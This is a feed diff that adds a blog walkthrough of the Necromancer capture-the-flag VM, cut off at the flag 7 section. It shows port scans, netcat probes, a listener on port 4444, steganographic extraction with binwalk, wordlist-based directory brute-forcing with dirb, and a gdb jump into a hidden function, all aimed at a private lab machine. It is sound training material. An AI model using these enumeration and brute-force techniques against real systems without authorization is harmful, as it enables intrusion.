@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-06-02T14:42:10-04:00</updated>
+  <updated>2018-06-09T16:40:20-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,1173 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Destroy The Necromancer]]></title>
+    <link href="http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer/"/>
+    <updated>2018-06-09T06:02:55-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/06/09/destroy-the-necromancer</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s challenge is a boot2root with 11 flags to collect.</p>
+
+<!-- more -->
+
+
+<p>The Nmap scan took really long and found nothing:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Nmap scan report for 192.168.217.142
+</span><span class='line'>Host is up (0.00023s latency).
+</span><span class='line'>All 65535 scanned ports on 192.168.217.142 are filtered
+</span><span class='line'>MAC Address: 00:0C:29:3B:03:B5 (VMware)
+</span><span class='line'>Too many fingerprints match this host to give specific OS details
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.23 ms 192.168.217.142
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 1336.70 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I tried an UDP scan, but only got 1 hit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT    STATE SERVICE
+</span><span class='line'>666/udp open  doom</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried connecting to it with netcat, but other than a message, I didn&rsquo;t find anything:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnu 192.168.217.142 666
+</span><span class='line'>(UNKNOWN) [192.168.217.142] 666 (?) open
+</span><span class='line'>
+</span><span class='line'>You gasp for air! Time is running out!
+</span><span class='line'>
+</span><span class='line'>You gasp for air! Time is running out!</span></code></pre></td></tr></table></div></figure>
+
+
+<h1>Flag #1 &ndash; Sniffing network traffic</h1>
+
+<p>With nothing else to go with, I started sniffing the local traffic and looked if the Necromancer is sending anything across the network:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/capture.PNG" title="capture" alt="Wireshark capture"></p>
+
+<p>The machine is trying to establish TCP connections (SYN flag) to different IPs, on port 4444. So what happens if we listen on that port on our attacker machine?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 4444
+</span><span class='line'>listening on [any] 4444 ...
+</span><span class='line'>connect to [192.168.223.129] from (UNKNOWN) [192.168.223.128] 25759
+</span><span class='line'>...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We received a string! I used an online Base64 decoder to decipher this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome!
+</span><span class='line'>
+</span><span class='line'>You find yourself staring towards the horizon, with nothing but silence surrounding you.
+</span><span class='line'>You look east, then south, then west, all you can see is a great wasteland of nothingness.
+</span><span class='line'>
+</span><span class='line'>Turning to your north you notice a small flicker of light in the distance.
+</span><span class='line'>You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  
+</span><span class='line'>
+</span><span class='line'>The air around you begins to get thicker, and your heart begins to beat against your chest. 
+</span><span class='line'>You turn to your left.. then to your right!  You are trapped!
+</span><span class='line'>
+</span><span class='line'>You fumble through your pockets.. nothing!  
+</span><span class='line'>You look down and see you are standing in sand.  
+</span><span class='line'>Dropping to your knees you begin to dig frantically.
+</span><span class='line'>
+</span><span class='line'>As you dig you notice the barrier extends underground!  
+</span><span class='line'>Frantically you keep digging and digging until your nails suddenly catch on an object.
+</span><span class='line'>
+</span><span class='line'>You dig further and discover a small wooden box.  
+</span><span class='line'>flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
+</span><span class='line'>
+</span><span class='line'>You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>An MD5 hash..I decoded it and moved on.</p>
+
+<p>Flag #1: <strong>opensesame</strong></p>
+
+<h1>Flag #2 &ndash; Chanting the string</h1>
+
+<p>In the previous message, we have a hint for the 2nd flag. Now we&rsquo;ve decoded the 1st flag, so we need to send it..where? To its doom! Remember the UDP port 666 we discovered earlier:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnu 192.168.223.128 666
+</span><span class='line'>(UNKNOWN) [192.168.223.128] 666 (?) open
+</span><span class='line'>opensesame
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>A loud crack of thunder sounds as you are knocked to your feet!
+</span><span class='line'>
+</span><span class='line'>Dazed, you start to feel fresh air entering your lungs.
+</span><span class='line'>
+</span><span class='line'>You are free!
+</span><span class='line'>
+</span><span class='line'>In front of you written in the sand are the words:
+</span><span class='line'>
+</span><span class='line'>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
+</span><span class='line'>
+</span><span class='line'>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
+</span><span class='line'>
+</span><span class='line'>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
+</span><span class='line'>
+</span><span class='line'>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
+</span><span class='line'>
+</span><span class='line'>The birds get closer, and closer, and closer.
+</span><span class='line'>
+</span><span class='line'>Staring up at the crows you can see they are in a formation.
+</span><span class='line'>
+</span><span class='line'>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
+</span><span class='line'>
+</span><span class='line'>As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
+</span><span class='line'>
+</span><span class='line'>666 is closed.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Another flag, another hash. Flag #2: <strong>1033750779</strong></p>
+
+<h1>Flag #3 &ndash; A pile of feathers</h1>
+
+<p>The hint mentioned the number 80, so I used my browser to navigate to it and ended up in The Chasm.</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/chasm.png" title="the chasm" alt="The Chasm"></p>
+
+<p>I&rsquo;ve downloaded the image, pileoffeathers.jpg, and ran it through exiftool, with no discoveries. Then I ran strings on it and saw a couple of mentions about a file called <em>feathers.txt</em>. I thought that a text file must be hidden in the image. so I looked for ways to extract it. Kali comes pre-equipped with just the right tool:</p>
+
+<blockquote><p>binwalk  &ndash; tool for searching binary images for embedded files and executable code</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>binwalk -e pileoffeathers.jpg 
+</span><span class='line'>
+</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span><span class='line'>--------------------------------------------------------------------------------
+</span><span class='line'>0             0x0             JPEG image data, EXIF standard
+</span><span class='line'>12            0xC             TIFF image data, little-endian offset of first image directory: 8
+</span><span class='line'>270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"&gt; &lt;rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
+</span><span class='line'>36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
+</span><span class='line'>37267         0x9193          End of Zip archive</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The files were extracted in a directory called _pileoffeathers.jpg.extracted. Inside I found the feathers.txt file in a ZIP archive called 9082.zip.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat feathers.txt 
+</span><span class='line'>ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Another Base64 string. Decoded it to find the flag and the hint:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at 
+</span><span class='line'>/amagicbridgeappearsatthechasm</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag #3: <strong>345465869</strong></p>
+
+<h1>Flag #4 &ndash; Talisman</h1>
+
+<p>On the web server, I went to the path of the above magic bridge, that leads to the cave:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/cave.png" title="cave" alt="cave entrance"></p>
+
+<p>Another image, this time it&rsquo;s a magicbook.jpg. But with all the usual tools I&rsquo;ve tried, I couldn&rsquo;t find any hidden information. I went back to the webpage and started bruteforcing for files and directories with different wordlists, and found nothing. Back to the drawing board..the hint is <em>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</em>. After looking on the interwebz for a bit, I went the route of building a custom dictionary of magical items to use with dirb. I used cewl to build a list from the words on <a href="https://dnd5e.info/magic-items/alphabetical-magic-item-list">https://dnd5e.info/magic-items/alphabetical-magic-item-list</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cewl https://dnd5e.info/magic-items/alphabetical-magic-item-list -w magicitems.txt
+</span><span class='line'>CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+</span><span class='line'>/usr/lib/ruby/vendor_ruby/spider/spider_instance.rb:125: warning: constant ::Fixnum is deprecated</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The wordlist has over 9k entries:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wc -l magicitems.txt 
+</span><span class='line'>9315 magicitems.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Back to dirb, and this time it found something!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dirb http://192.168.223.128/amagicbridgeappearsatthechasm/ /root/Downloads/magicitems.txt 
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>DIRB v2.22    
+</span><span class='line'>By The Dark Raver
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>START_TIME: Sat Jun  9 09:08:18 2018
+</span><span class='line'>URL_BASE: http://192.168.223.128/amagicbridgeappearsatthechasm/
+</span><span class='line'>WORDLIST_FILES: /root/Downloads/magicitems.txt
+</span><span class='line'>
+</span><span class='line'>-----------------
+</span><span class='line'>
+</span><span class='line'>GENERATED WORDS: 9315                                                          
+</span><span class='line'>
+</span><span class='line'>---- Scanning URL: http://192.168.223.128/amagicbridgeappearsatthechasm/ ----
+</span><span class='line'>+ http://192.168.223.128/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)
+</span><span class='line'>                                                                               
+</span><span class='line'>-----------------
+</span><span class='line'>END_TIME: Sat Jun  9 09:08:37 2018
+</span><span class='line'>DOWNLOADED: 9315 - FOUND: 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A talisman! Going to the path leads to a binary called talisman. But running it doesn&rsquo;t produce the effect I&rsquo;d hoped:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./talisman 
+</span><span class='line'>You have found a talisman.
+</span><span class='line'>
+</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it's surface.
+</span><span class='line'>
+</span><span class='line'>Do you want to wear the talisman?  y
+</span><span class='line'>
+</span><span class='line'>Nothing happens.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I fired up GDB, set a breakpoint on main and ran the executable again.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048a21 in main ()
+</span><span class='line'>(gdb) disassemble
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x08048a13 &lt;+0&gt;: lea    0x4(%esp),%ecx
+</span><span class='line'>   0x08048a17 &lt;+4&gt;: and    $0xfffffff0,%esp
+</span><span class='line'>   0x08048a1a &lt;+7&gt;: pushl  -0x4(%ecx)
+</span><span class='line'>   0x08048a1d &lt;+10&gt;:    push   %ebp
+</span><span class='line'>   0x08048a1e &lt;+11&gt;:    mov    %esp,%ebp
+</span><span class='line'>   0x08048a20 &lt;+13&gt;:    push   %ecx
+</span><span class='line'>=&gt; 0x08048a21 &lt;+14&gt;: sub    $0x4,%esp
+</span><span class='line'>   0x08048a24 &lt;+17&gt;:    call   0x8048529 &lt;wearTalisman&gt;
+</span><span class='line'>   0x08048a29 &lt;+22&gt;:    mov    $0x0,%eax
+</span><span class='line'>   0x08048a2e &lt;+27&gt;:    add    $0x4,%esp
+</span><span class='line'>   0x08048a31 &lt;+30&gt;:    pop    %ecx
+</span><span class='line'>   0x08048a32 &lt;+31&gt;:    pop    %ebp
+</span><span class='line'>   0x08048a33 &lt;+32&gt;:    lea    -0x4(%ecx),%esp
+</span><span class='line'>   0x08048a36 &lt;+35&gt;:    ret    </span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a wearTalisman function that is about to be called. Must be what we&rsquo;ve seen when running the binary. I set up another breakpoint on this function and disassembled it, but I could see nothing interesting. Then I looked what other functions there might be in the binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) info functions
+</span><span class='line'>All defined functions:
+</span><span class='line'>
+</span><span class='line'>Non-debugging symbols:
+</span><span class='line'>0x080482d0  _init
+</span><span class='line'>0x08048310  printf@plt
+</span><span class='line'>0x08048320  __libc_start_main@plt
+</span><span class='line'>0x08048330  __isoc99_scanf@plt
+</span><span class='line'>0x08048350  _start
+</span><span class='line'>0x08048380  __x86.get_pc_thunk.bx
+</span><span class='line'>0x08048390  deregister_tm_clones
+</span><span class='line'>0x080483c0  register_tm_clones
+</span><span class='line'>0x08048400  __do_global_dtors_aux
+</span><span class='line'>0x08048420  frame_dummy
+</span><span class='line'>0x0804844b  unhide
+</span><span class='line'>0x0804849d  hide
+</span><span class='line'>0x080484f4  myPrintf
+</span><span class='line'>0x08048529  wearTalisman
+</span><span class='line'>0x08048a13  main
+</span><span class='line'>0x08048a37  chantToBreakSpell
+</span><span class='line'>0x08049530  __libc_csu_init
+</span><span class='line'>0x08049590  __libc_csu_fini
+</span><span class='line'>0x08049594  _fini
+</span><span class='line'>0xf7fd6a30  _dl_catch_exception@plt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A function named chantToBreakSpell sounds exactly like what we need! And it wasn&rsquo;t called from main or wearTalisman. So I jumped directly to it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) jump chantToBreakSpell
+</span><span class='line'>Continuing at 0x8048a3b.
+</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+</span><span class='line'>You fall to your knees.. weak and weary.
+</span><span class='line'>Looking up you can see the spell is still protecting the cave entrance.
+</span><span class='line'>The talisman is now almost too hot to touch!
+</span><span class='line'>Turning it over you see words now etched into the surface:
+</span><span class='line'>flag4{ea50536158db50247e110a6c89fcf3d3}
+</span><span class='line'>Chant these words at u31337
+</span><span class='line'>!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+</span><span class='line'>[Inferior 1 (process 3652) exited with code 0102]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The talisman worked! Flag #4: <strong>blackmagic</strong></p>
+
+<h1>Flag #5 &ndash; Black magic</h1>
+
+<p>Like before, I&rsquo;ve tried sending the string, this time to UDP 31337, but:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnu 192.168.223.128 31337
+</span><span class='line'>(UNKNOWN) [192.168.223.128] 31337 (?) open
+</span><span class='line'>bNothing happens.
+</span><span class='line'>lNothing happens.
+</span><span class='line'>aNothing happens.
+</span><span class='line'>cNothing happens.
+</span><span class='line'>kNothing happens.
+</span><span class='line'>mNothing happens.
+</span><span class='line'>aNothing happens.
+</span><span class='line'>gNothing happens.
+</span><span class='line'>iNothing happens.
+</span><span class='line'>cNothing happens.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So I tried a different method of sending the string by piping it to netcat and it worked:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo blackmagic | nc -u 192.168.223.128 31337
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>As you chant the words, a hissing sound echoes from the ice walls.
+</span><span class='line'>
+</span><span class='line'>The blue aura disappears from the cave entrance.
+</span><span class='line'>
+</span><span class='line'>You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.
+</span><span class='line'>
+</span><span class='line'>You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.
+</span><span class='line'>
+</span><span class='line'>The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.
+</span><span class='line'>
+</span><span class='line'>Suddenly, you are attacked by a swarm of bats!
+</span><span class='line'>
+</span><span class='line'>You aimlessly thrash at the air in front of you!
+</span><span class='line'>
+</span><span class='line'>The bats continue their relentless attack, until.... silence.
+</span><span class='line'>
+</span><span class='line'>Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.
+</span><span class='line'>
+</span><span class='line'>Looking towards one of the torches, you see something on the cave wall.
+</span><span class='line'>
+</span><span class='line'>You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.
+</span><span class='line'>
+</span><span class='line'>/thenecromancerwillabsorbyoursoul
+</span><span class='line'>
+</span><span class='line'>flag5{0766c36577af58e15545f099a3b15e60}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Flag #5: <strong>809472671</strong></p>
+
+<h1>Flag #6 &ndash; Necromancer</h1>
+
+<p>Went to the new path and found the necromancer and a flag!</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/necromancer/necromancer-fullpage.png" title="necromancer" alt="necromancer"></p>
+
+<p>Flag #6: <strong>1756462165</strong></p>
+
+<h1>Flag #7 &ndash; Not your average SNMP walk</h1>
+
+<p>The necromancer link points to another binary, but when I tried to run it I got an error:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./necromancer 
+</span><span class='line'>bash: ./necromancer: cannot execute binary file: Exec format error</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This file is not an executable:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>file necromancer
+</span><span class='line'>necromancer: bzip2 compressed data, block size = 900k</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From it I&rsquo;ve extracted a packet capture file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
